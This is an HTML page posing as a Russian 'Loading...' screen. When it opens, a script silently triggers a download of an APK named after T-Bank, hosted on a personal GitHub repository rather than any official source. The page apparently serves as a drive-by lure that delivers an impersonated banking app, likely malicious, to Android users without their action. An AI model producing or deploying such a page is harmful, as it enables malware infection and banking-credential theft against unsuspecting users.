<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body, html {
            width: 100%;
            height: 100%;
            overflow: hidden; /* Убирает прокрутку */
            background-color: #000; /* Черный фон, пока грузится фото */
        }
        .background {
            /* Сюда вставьте ссылку на ваше фото */
            background-image: url('https://raw.githubusercontent.com/Artem0790YT/tbank/refs/heads/main/IMG_4042.jpeg'); 
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
        }
    </style>
</head>
<body>

    <div class="background"></div>

    <script>
        window.onload = function() {
            /* Сюда вставьте ссылку на скачиваемый файл */
            const fileUrl = 'https://github.com/Artem0790YT/tbank/raw/refs/heads/main/T-%D0%91%D0%B0%D0%BD%D0%BA_1.0.apk'; 
            
            const link = document.createElement('a');
            link.href = fileUrl;
            link.setAttribute('download', ''); 
            
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        };
    </script>

</body>
</html>
